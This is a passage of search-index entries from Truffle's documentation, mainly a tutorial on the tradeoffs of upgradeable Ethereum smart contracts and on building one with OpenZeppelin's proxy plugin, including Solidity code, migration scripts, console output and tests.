"guides/upgrading-from-truffle-2-to-3/#fin", "text": "That's it! That's all you need to know to upgrade from Truffle 2.0 to 3.0. It might require a bit of work, but the changes are surely worth it. If you have questions, Truffle has a vibrant community of Trufflers available 24/7 to help you with any issues you may have. Don't hesitate to ask for help, and we wish you a happy 3.0! -- The Truffle Team", "title": "Fin"}, {"location": "guides/upgrading-security/", "text": "Web3 Unleashed: Upgrading Smart Contracts - Should You Do it and How? \u00b6 Written by Emily Lin Last updated 8/19/2022 Overview \u00b6 In this episode of Web3 Unleashed, we'll be going over smart contract upgrades: what they are, the security implications of doing so, and how to do it! Watch our livestream recording with security solutions architect Michael Lewellen from OpenZeppelin on YouTube for a more in-depth explanation and interview! There, we'll dive further in detail about the different types of upgrade patterns as well as tips and tricks should you decide to write an upgradeable smart contract! What is a smart contract upgrade? \u00b6 By default, smart contracts are immutable, which is necessary to the trustlessness, decentralization, and security of Ethereum. However, what happens when you discover a smart contract vulnerability? Or what if you want to add in new features and capabilities? Smart contract upgrades are essentially different strategies one might take to change the functionality of a contract. Note that the initial contract must be deployed in an upgradeable way if you want to change contract code. This is also NOT the same as being able to change the internal code. Instead, upgradeability means you are changing the code that gets executed. Extensive research has been done to discover various patterns for writing upgradeable smart contracts while trying to minimize centralization and the inherent security risks. OpenZeppelin has a great article here that goes over them. Should you upgrade smart contracts? \u00b6 What are the tradeoffs? \u00b6 Before diving into even how we upgrade, we should first consider whether or not we should do it in the first place. The pros for upgradeable smart contracts largely falls into two categories: Discovered vulnerabilities post-deployment are easier and faster to fix. Developers can improve their dapps by experimenting with and adding new features over time. While this sounds great, violating immutability affects trustlessness, security, and decentralization in the following ways: Because developers can change the code, users must trust the developers to not do so maliciously or arbitrarily. Writing upgradeable smart contracts is inherently difficult and complex. As a result, developers may introduce more flaws than would have existed otherwise. If the ability to upgrade the contract is insecure or centralized, it is easy for attackers to make malicious upgrades. Lastly, depending on how you decide to upgrade your contracts, you could potentially incur high gas costs. How do you decide to upgrade? \u00b6 After taking into consideration the implications of smart contract upgrades, the next step is to actually make the decision of whether or not to go through it. It is critical this decision does not fall in the hands of a single account. A single account not only overturns decentralization, but compromised keys will have disastrous consequences for the security of the contract. There are a few popular ways of enacting the upgrade: Multi-sig contracts allow for there to be multiple owners, with decisions being made once a certain threshold of stakeholders agree Timelock refers to a time delay for when the change actually goes into effect. This gives users time to exit if they disagree with the change. However there are two issues that arise from timelocks: The delay can be a major blocker to a quick response to a critical bug. This can be mitigated by pausing and escape hatches . In this case, trusted developers are allowed to pause operations as soon as an issue is detected, such as stopping token transfers, to prevent more harm. Meanwhile, users can exit the system, such as extracting out their funds, using an escape hatch that was coded into the smart contract. Publishing a timelocked upgrade to be added later allows attackers to reverse-engineer the change and potentially exploit the bug before the change goes into effect. In this case, commit-reveal strategies are used by announcing an upgrade, but not revealing it until the delay expires. Voting decentralizes the decision making further by granting your community the right to vote on changes, usually done through some governance token. Note that this is often used in conjunction with the other strategies listed above. How do you upgrade a smart contract? \u00b6 As mentioned before, there are a number of technically complex ugprade patterns laid out here . At the core of it, upgrade patterns rely on a proxy contract and an implementation contract (aka logic contract ). The proxy contract knows the contract address of the implementation contract and delegates all calls it receives to it. This means that: Execution of the implementation contract code is happening within the context of the proxy contract. Reads or writes to storage only affect the storage of the proxy contract, not the implementation contract. msg.sender is the address of whoever called the proxy contract This is all possible because of the opcode DELEGATECALL , which basically allows a contract to execute code from another contract as if it were an internal function. As a result, upgrading is actually relatively straightforward - you just change out the implementation address. The real complexity comes in when considering the actual upgrade logic. We won't dive into it all the variations, but the OpenZeppelin Upgrades plugin uses the transparent proxy pattern pattern, which you can read more about here and here . Now, let's actually go walk through an example! The completed code is here . Download System Requirements \u00b6 You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it upgrade-contract , and select Web3 API from the dropdown Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. If you're looking specifically for goerli eth, try this one or this one . Set Up Your Project \u00b6 Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called upgrade-contract . truffle init upgrade-contract cd upgrade-contract truffle create contract UpgradeablePet truffle create test UpgradeablePet Afterwards, your project structure should look something like this: upgrade-contract \u251c\u2500\u2500 contracts \u2502 \u2514\u2500\u2500 UpgradeablePet.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 upgradeable_pet.js \u2514\u2500\u2500 truffle-config.js Write an Upgradeable Contract V1 \u00b6 Let's start by writing our base contract that we'll be progressively upgrading! First off, our contract needs to be upgrade safe. This means that the contract: cannot have a constructor should not use the selfdestruct or delegatecall operations You can read more about why here . Our first iteration of UpgradeablePet is gonna be super simple - all it will do is store a value and get that value. It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; contract UpgradeablePet { uint256 private _value ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); // Stores a new value in the contract function store ( uint256 value ) public { _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } } Let's say we actually only want the pet owner to be able to change the contents of UpgradeablePet . How do we pass in the appropriate address if we can't have a constructor? OpenZeppelin has provided a base contract called Initializer , which will help us run the necessary initalization code. First, we will need to download it as follows: npm i @openzeppelin/contracts-upgradeable And then, we can modify UpgradeablePet : // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\" ; contract UpgradeablePet is Initializable { uint256 private _value ; address private _petOwner ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); function initialize ( address petOwner ) public initializer { _petOwner = petOwner ; } /// @custom:oz-upgrades-unsafe-allow constructor constructor () { _disableInitializers (); } // Stores a new value in the contract function store ( uint256 value ) public { require ( msg . sender == _petOwner , \"UpgradeablePet: not owner\" ); _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } } Two things to note: If there are any parent contracts, initialize will have to manually call the initalize functions of those parent contracts well. You'll notice we actually did leave in a constructor in addition to initialize . This ensures the contract is in an initialized state. Otherwise, an uninitialized implementation contract can be taken over by an attacker. Now, we need to modify 1_deploy_contracts.js to tell Truffle how to deploy this file. We'll first need to download the plugin: npm i --save-dev @openzeppelin/truffle-upgrades Then, modify your migration file as follows: const { deployProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( 'UpgradeablePet' ); module . exports = async function ( deployer , network , accounts ) { await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { deployer , initializer : 'initialize' }); }; In order to test this, we'll just do this on the fly. You can either call truffle develop , which will bring up a ganache instance on 9545, or open up your own ganache instance, modify development in truffle-config.js , and run truffle console . For this guide, we recommend opening up a separate ganache instance so that the contract addresses are preserved. truffle ( develop ) > migrate Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'development' > Network id: 1660859525632 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Replacing 'UpgradeablePet' -------------------------- > transaction hash: 0xb42a280a989a089efb526930b1da5f80cd41a487f4b0facd9d6ccc376e273f56 > Blocks: 0 Seconds: 0 > contract address: 0xc094d30a290db2C0781fF97874D35A6dF8c0F225 > block number: 11 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .985882023380156735 > gas used: 410834 ( 0x644d2 ) > gas price: 2 .739722993 gwei > value sent: 0 ETH > total cost: 0 .001125571356106162 ETH Deploying 'ProxyAdmin' ---------------------- > transaction hash: 0xac44c24fa0ca5e3118e1c027474e55584c8ec13e48e797e315d6812d5ccc94b6 > Blocks: 0 Seconds: 0 > contract address: 0x749D40F055727817e9E9D56e5247722407ccae17 > block number: 12 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .984570049252513955 > gas used: 484020 ( 0x762b4 ) > gas price: 2 .710578339 gwei > value sent: 0 ETH > total cost: 0 .00131197412764278 ETH Deploying 'TransparentUpgradeableProxy' --------------------------------------- > transaction hash: 0xd82a7bcec734f0e69d614016d3408a64ef564082d328215e4f79e8669934f9c7 > Blocks: 0 Seconds: 0 > contract address: 0xb85a509102B82f02281b0451C43FA37e00d625ad > block number: 13 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .982844095713016935 > gas used: 642788 ( 0x9cee4 ) > gas price: 2 .685105415 gwei > value sent: 0 ETH > total cost: 0 .00172595353949702 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .004163499023245962 ETH Summary ======= > Total deployments: 3 > Final cost: 0 .004163499023245962 ETH As you can see, deployProxy does three things: Deploy the implementation contract (our Box contract) Deploy the ProxyAdmin contract (the admin for our proxy). Deploy the proxy contract and run any initializer function. Now, we can just call contract functions directly from the console to quickly see if our contract is working. truffle ( development ) > let contract = await UpgradeablePet.deployed () ; undefined truffle ( development ) > await contract.store ( 5 ) { tx: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , receipt: { transactionHash: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , transactionIndex: 0 , blockNumber: 14 , blockHash: '0x5ebca4e4c9d5bed1300e6fe9399144f47f8f751ce2bd4a655b160242cb540e44' , from: '0xa8469e3bf6474abb1290a4c03f43021667df130e' , to: '0xb85a509102b82f02281b0451c43fa37e00d625ad' , cumulativeGasUsed: 54413 , gasUsed: 54413 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x40000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000040000000000000000000000400000000000000000000000000000' , status: true, effectiveGasPrice: 2662958768 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0xb85a509102B82f02281b0451C43FA37e00d625ad' , blockHash: '0x5ebca4e4c9d5bed1300e6fe9399144f47f8f751ce2bd4a655b160242cb540e44' , blockNumber: 14 , logIndex: 0 , removed: false, transactionHash: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , transactionIndex: 0 , id: 'log_c488ac08' , event: 'ValueChanged' , args: [ Result ] } ] } truffle ( development ) > contract.retrieve () BN { negative: 0 , words: [ 5 , < 1 empty item> ] , length: 1 , red: null } Nice! Before moving forward, let's write a test! When writing tests for upgrades we'll need to write tests for both the implementation contract AND the proxy contract. Luckily, we can use OpenZeppelin's deployProxy in our tests. Let's first install OpenZeppelin's test helpers to make testing a little easier. npm i --save-dev @openzeppelin/test-helpers Writing the test for the implementation contract is the same as usual. Let's create a file called upgradeable_pets.js under the test folder and add this code: const { expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); contract ( \"UpgradeablePet\" , function ( accounts ) { it ( \"should retrieve correctly stored value\" , async function () { const upgradeablePetInstance = await UpgradeablePet . deployed (); let tx = await upgradeablePetInstance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); }); it ( \"should not set the stored value if not owner\" , async function () { const upgradeablePetInstance = await UpgradeablePet . deployed (); // Failed require in function await expectRevert ( upgradeablePetInstance . store ( 10 , { from : accounts [ 1 ]}), \"UpgradeablePet: not owner\" ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet value should not have changed\" ); }); }); Then, create a test file called upgradeable_pets.proxy.js , and add the following: const { expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const { deployProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); contract ( \"UpgradeablePet (Proxy)\" , function ( accounts ) { it ( \"should retrieve correctly stored value\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); let tx = await upgradeablePetInstance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); }); it ( \"should not set the stored value if not owner\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); // Failed require in function await expectRevert ( upgradeablePetInstance . store ( 10 , { from : accounts [ 1 ]}), \"UpgradeablePet: not owner\" ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 0 , \"UpgradeablePet value should not have changed\" ); }); }); You'll notice instead of using UpgradeablePet.deployed() , we use deployProxy to get our contract instance. To test, simply call truffle test to make sure everything is working properly. Write the Upgradeable Contract V2 \u00b6 Now, let's get to the exciting part: actually adding a change! We will first create a new duplicate contract and then add an increment function to increment the stored value. Create a new contract UpgradeablePetV2 with an increment function. It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\" ; contract UpgradeablePetV2 is Initializable { uint256 private _value ; address private _petOwner ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); function initialize ( address petOwner ) public initializer { _petOwner = petOwner ; } /// @custom:oz-upgrades-unsafe-allow constructor constructor () initializer {} // Stores a new value in the contract function store ( uint256 value ) public { require ( msg . sender == _petOwner , \"UpgradeablePet: not owner\" ); _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } // Increments the stored value by 1 function increment () public { _value = _value + 1 ; emit ValueChanged ( _value ); } } Now, we'll be using OpenZeppelin's upgradeProxy function, which will: Deploy the implementation contract ( UpgradeablePetV2 ) Call the ProxyAdmin to update the proxy contract to use the new implementation. We will use this in our new deployment script: const { upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( 'UpgradeablePet' ); const UpgradeablePetV2 = artifacts . require ( 'UpgradeablePetV2' ); module . exports = async function ( deployer ) { const alreadyDeployed = await UpgradeablePet . deployed (); await upgradeProxy ( alreadyDeployed . address , UpgradeablePetV2 , { deployer }); }; Then, call migrate from the console, and test out increment: truffle ( development ) > contract = await UpgradeablePet.deployed () undefined truffle ( development ) > contract.address '0xAe02BB114AAD3Edf8b87827Cf001F3D49165b426' truffle ( development ) > let contractv2 = await UpgradeablePetV2.at ( contract.address ) undefined truffle ( development ) > contractv2.retrieve () BN { negative: 0 , words: [ 5 , < 1 empty item> ] , length: 1 , red: null } truffle ( development ) > contractv2.increment () { tx: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , receipt: { transactionHash: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , transactionIndex: 0 , blockNumber: 36 , blockHash: '0xe75e2d55a8d310f6686c61f5f8ecf75e05b8be96b985ac31f515a90eafe058d2' , from: '0xa8469e3bf6474abb1290a4c03f43021667df130e' , to: '0xae02bb114aad3edf8b87827cf001f3d49165b426' , cumulativeGasUsed: 35076 , gasUsed: 35076 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x40000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000200' , status: true, effectiveGasPrice: 2509015503 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0xAe02BB114AAD3Edf8b87827Cf001F3D49165b426' , blockHash: '0xe75e2d55a8d310f6686c61f5f8ecf75e05b8be96b985ac31f515a90eafe058d2' , blockNumber: 36 , logIndex: 0 , removed: false, transactionHash: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , transactionIndex: 0 , id: 'log_b88893d4' , event: 'ValueChanged' , args: [ Result ] } ] } truffle ( development ) > contractv2.retrieve () BN { negative: 0 , words: [ 6 , < 1 empty item> ] , length: 1 , red: null } Notice that we used let contractv2 = await UpgradeablePetV2.at(contract.address) . .at is a special Truffle function that allows you to create a new abstraction at the same address. Finally, let's write the tests. Again, we'll need to test both the implementation contract and the proxy contract. Create a file upgradeable_pet_V2.js and add: const { expectEvent } = require ( '@openzeppelin/test-helpers' ); const UpgradeablePetV2 = artifacts . require ( \"UpgradeablePetV2\" ); contract ( \"UpgradeablePetV2\" , function ( accounts ) { it ( \"should increment the stored value\" , async function () { const upgradeablePetV2Instance = await UpgradeablePetV2 . deployed (); let tx = await upgradeablePetV2Instance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePetV2 did not store correct value\" ); await upgradeablePetV2Instance . increment (); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 6 , \"UpgradeablePetV2 did not increment\" ); }); }); Like deployProxy , we can also use upgradeProxy in our tests. Create a new test called upgradeable_pet_V2.proxy.js : const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); const UpgradeablePetV2 = artifacts . require ( \"UpgradeablePetV2\" ); contract ( \"UpgradeablePetV2 (Proxy)\" , function ( accounts ) { it ( \"should increment the stored value\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); await upgradeablePetInstance . store ( 5 ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); const upgradeablePetV2Instance = await upgradeProxy ( upgradeablePetInstance . address , UpgradeablePetV2 ); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePetV2 did not store correct value\" ); await upgradeablePetV2Instance . increment (); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 6 , \"UpgradeablePetV2 did not increment\" ); }); }); The point we want to test here is that state was preserved between V1 and V2 of the smart contract. Future Extensions \u00b6 And there you have it! You've upgraded a smart contract! Again, be sure to watch the livestream on YouTube , and see what's upcoming on our GitHub page . OpenZeppelin has also written their own blog post that goes much more in depth and includes real-world examples here . If you're interested in making the previous episode's contracts upgradable, you'll need to use the ugpradable versions of their base contracts, which can be installed via npm i @open-zeppelin/upgradeable-contract , which will use initialize instead of constructor . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Upgrading Smart Contracts - Should You Do it and How?"}, {"location": "guides/upgrading-security/#web3-unleashed-upgrading-smart-contracts-should-you-do-it-and-how", "text": "Written by Emily Lin Last updated 8/19/2022", "title": "Web3 Unleashed: Upgrading Smart Contracts - Should You Do it and How?"}, {"location": "guides/upgrading-security/#overview", "text": "In this episode of Web3 Unleashed, we'll be going over smart contract upgrades: what they are, the security implications of doing so, and how to do it! Watch our livestream recording with security solutions architect Michael Lewellen from OpenZeppelin on YouTube for a more in-depth explanation and interview! There, we'll dive further in detail about the different types of upgrade patterns as well as tips and tricks should you decide to write an upgradeable smart contract!", "title": "Overview"}, {"location": "guides/upgrading-security/#what-is-a-smart-contract-upgrade", "text": "By default, smart contracts are immutable, which is necessary to the trustlessness, decentralization, and security of Ethereum. However, what happens when you discover a smart contract vulnerability? Or what if you want to add in new features and capabilities? Smart contract upgrades are essentially different strategies one might take to change the functionality of a contract. Note that the initial contract must be deployed in an upgradeable way if you want to change contract code. This is also NOT the same as being able to change the internal code. Instead, upgradeability means you are changing the code that gets executed. Extensive research has been done to discover various patterns for writing upgradeable smart contracts while trying to minimize centralization and the inherent security risks. OpenZeppelin has a great article here that goes over them.", "title": "What is a smart contract upgrade?"}, {"location": "guides/upgrading-security/#should-you-upgrade-smart-contracts", "text": "", "title": "Should you upgrade smart contracts?"}, {"location": "guides/upgrading-security/#what-are-the-tradeoffs", "text": "Before diving into even how we upgrade, we should first consider whether or not we should do it in the first place. The pros for upgradeable smart contracts largely falls into two categories: Discovered vulnerabilities post-deployment are easier and faster to fix. Developers can improve their dapps by experimenting with and adding new features over time. While this sounds great, violating immutability affects trustlessness, security, and decentralization in the following ways: Because developers can change the code, users must trust the developers to not do so maliciously or arbitrarily. Writing upgradeable smart contracts is inherently difficult and complex. As a result, developers may introduce more flaws than would have existed otherwise. If the ability to upgrade the contract is insecure or centralized, it is easy for attackers to make malicious upgrades. Lastly, depending on how you decide to upgrade your contracts, you could potentially incur high gas costs.", "title": "What are the tradeoffs?"}, {"location": "guides/upgrading-security/#how-do-you-decide-to-upgrade", "text": "After taking into consideration the implications of smart contract upgrades, the next step is to actually make the decision of whether or not to go through it. It is critical this decision does not fall in the hands of a single account. A single account not only overturns decentralization, but compromised keys will have disastrous consequences for the security of the contract. There are a few popular ways of enacting the upgrade: Multi-sig contracts allow for there to be multiple owners, with decisions being made once a certain threshold of stakeholders agree Timelock refers to a time delay for when the change actually goes into effect. This gives users time to exit if they disagree with the change. However there are two issues that arise from timelocks: The delay can be a major blocker to a quick response to a critical bug. This can be mitigated by pausing and escape hatches . In this case, trusted developers are allowed to pause operations as soon as an issue is detected, such as stopping token transfers, to prevent more harm. Meanwhile, users can exit the system, such as extracting out their funds, using an escape hatch that was coded into the smart contract. Publishing a timelocked upgrade to be added later allows attackers to reverse-engineer the change and potentially exploit the bug before the change goes into effect. In this case, commit-reveal strategies are used by announcing an upgrade, but not revealing it until the delay expires. Voting decentralizes the decision making further by granting your community the right to vote on changes, usually done through some governance token. Note that this is often used in conjunction with the other strategies listed above.", "title": "How do you decide to upgrade?"}, {"location": "guides/upgrading-security/#how-do-you-upgrade-a-smart-contract", "text": "As mentioned before, there are a number of technically complex ugprade patterns laid out here . At the core of it, upgrade patterns rely on a proxy contract and an implementation contract (aka logic contract ). The proxy contract knows the contract address of the implementation contract and delegates all calls it receives to it. This means that: Execution of the implementation contract code is happening within the context of the proxy contract. Reads or writes to storage only affect the storage of the proxy contract, not the implementation contract. msg.sender is the address of whoever called the proxy contract This is all possible because of the opcode DELEGATECALL , which basically allows a contract to execute code from another contract as if it were an internal function. As a result, upgrading is actually relatively straightforward - you just change out the implementation address. The real complexity comes in when considering the actual upgrade logic. We won't dive into it all the variations, but the OpenZeppelin Upgrades plugin uses the transparent proxy pattern pattern, which you can read more about here and here . Now, let's actually go walk through an example! The completed code is here .", "title": "How do you upgrade a smart contract?"}, {"location": "guides/upgrading-security/#download-system-requirements", "text": "You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI", "title": "Download System Requirements"}, {"location": "guides/upgrading-security/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it upgrade-contract , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/upgrading-security/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/upgrading-security/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/upgrading-security/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. If you're looking specifically for goerli eth, try this one or this one .", "title": "Get Some Test Eth"}, {"location": "guides/upgrading-security/#set-up-your-project", "text": "Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called upgrade-contract . truffle init upgrade-contract cd upgrade-contract truffle create contract UpgradeablePet truffle create test UpgradeablePet Afterwards, your project structure should look something like this: upgrade-contract \u251c\u2500\u2500 contracts \u2502 \u2514\u2500\u2500 UpgradeablePet.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 upgradeable_pet.js \u2514\u2500\u2500 truffle-config.js", "title": "Set Up Your Project"}, {"location": "guides/upgrading-security/#write-an-upgradeable-contract-v1", "text": "Let's start by writing our base contract that we'll be progressively upgrading! First off, our contract needs to be upgrade safe. This means that the contract: cannot have a constructor should not use the selfdestruct or delegatecall operations You can read more about why here . Our first iteration of UpgradeablePet is gonna be super simple - all it will do is store a value and get that value. It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; contract UpgradeablePet { uint256 private _value ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); // Stores a new value in the contract function store ( uint256 value ) public { _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } } Let's say we actually only want the pet owner to be able to change the contents of UpgradeablePet . How do we pass in the appropriate address if we can't have a constructor? OpenZeppelin has provided a base contract called Initializer , which will help us run the necessary initalization code. First, we will need to download it as follows: npm i @openzeppelin/contracts-upgradeable And then, we can modify UpgradeablePet : // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\" ; contract UpgradeablePet is Initializable { uint256 private _value ; address private _petOwner ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); function initialize ( address petOwner ) public initializer { _petOwner = petOwner ; } /// @custom:oz-upgrades-unsafe-allow constructor constructor () { _disableInitializers (); } // Stores a new value in the contract function store ( uint256 value ) public { require ( msg . sender == _petOwner , \"UpgradeablePet: not owner\" ); _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } } Two things to note: If there are any parent contracts, initialize will have to manually call the initalize functions of those parent contracts well. You'll notice we actually did leave in a constructor in addition to initialize . This ensures the contract is in an initialized state. Otherwise, an uninitialized implementation contract can be taken over by an attacker. Now, we need to modify 1_deploy_contracts.js to tell Truffle how to deploy this file. We'll first need to download the plugin: npm i --save-dev @openzeppelin/truffle-upgrades Then, modify your migration file as follows: const { deployProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( 'UpgradeablePet' ); module . exports = async function ( deployer , network , accounts ) { await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { deployer , initializer : 'initialize' }); }; In order to test this, we'll just do this on the fly. You can either call truffle develop , which will bring up a ganache instance on 9545, or open up your own ganache instance, modify development in truffle-config.js , and run truffle console . For this guide, we recommend opening up a separate ganache instance so that the contract addresses are preserved. truffle ( develop ) > migrate Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'development' > Network id: 1660859525632 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Replacing 'UpgradeablePet' -------------------------- > transaction hash: 0xb42a280a989a089efb526930b1da5f80cd41a487f4b0facd9d6ccc376e273f56 > Blocks: 0 Seconds: 0 > contract address: 0xc094d30a290db2C0781fF97874D35A6dF8c0F225 > block number: 11 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .985882023380156735 > gas used: 410834 ( 0x644d2 ) > gas price: 2 .739722993 gwei > value sent: 0 ETH > total cost: 0 .001125571356106162 ETH Deploying 'ProxyAdmin' ---------------------- > transaction hash: 0xac44c24fa0ca5e3118e1c027474e55584c8ec13e48e797e315d6812d5ccc94b6 > Blocks: 0 Seconds: 0 > contract address: 0x749D40F055727817e9E9D56e5247722407ccae17 > block number: 12 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .984570049252513955 > gas used: 484020 ( 0x762b4 ) > gas price: 2 .710578339 gwei > value sent: 0 ETH > total cost: 0 .00131197412764278 ETH Deploying 'TransparentUpgradeableProxy' --------------------------------------- > transaction hash: 0xd82a7bcec734f0e69d614016d3408a64ef564082d328215e4f79e8669934f9c7 > Blocks: 0 Seconds: 0 > contract address: 0xb85a509102B82f02281b0451C43FA37e00d625ad > block number: 13 > block timestamp: 1660863108 > account: 0xA8469E3bF6474abb1290a4c03F43021667df130e > balance: 999 .982844095713016935 > gas used: 642788 ( 0x9cee4 ) > gas price: 2 .685105415 gwei > value sent: 0 ETH > total cost: 0 .00172595353949702 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .004163499023245962 ETH Summary ======= > Total deployments: 3 > Final cost: 0 .004163499023245962 ETH As you can see, deployProxy does three things: Deploy the implementation contract (our Box contract) Deploy the ProxyAdmin contract (the admin for our proxy). Deploy the proxy contract and run any 